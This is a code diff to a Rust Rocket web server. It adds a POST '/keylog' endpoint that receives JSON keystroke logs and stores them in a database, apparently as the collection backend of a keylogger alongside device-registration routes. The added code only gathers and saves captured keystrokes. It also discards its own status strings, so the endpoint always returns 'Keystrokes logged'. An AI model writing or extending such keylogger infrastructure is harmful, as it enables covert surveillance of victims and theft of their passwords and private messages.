@@ -55,7 +55,40 @@ fn open_app() -> &'static str {
     "App opened!"
 }
 
+#[post("/keylog", format = "json", data = "<log>")]
+async fn log_keys(log:Json<KeyLog>) -> &'static str{
+
+    let key = "DATABASE_URL";
+    dotenv().ok();
+    match env::var(key){
+        Ok(val) => {
+            let database_connection = Database{
+                url: val,
+            };
+            
+             
+                match database_connection.save_keylog(&log).await {
+                    Ok(_) => {
+                        println!("Keylogs Saved!");
+                    },
+                    Err(err) => {
+                        eprintln!("{err}")
+                    }
+                };
+            
+            "Keylog saved!";
+
+
+           
+        },
+        Err(err) => {
+            eprintln!("{err}");
+            "Error";
+        }
+    }
+    "Keystrokes logged"
+}
 #[launch]
 fn rocket() -> _ {
-    rocket::build().mount("/api", routes![index, new_device, open_app])
+    rocket::build().mount("/api", routes![index, new_device, open_app,log_keys])
 }
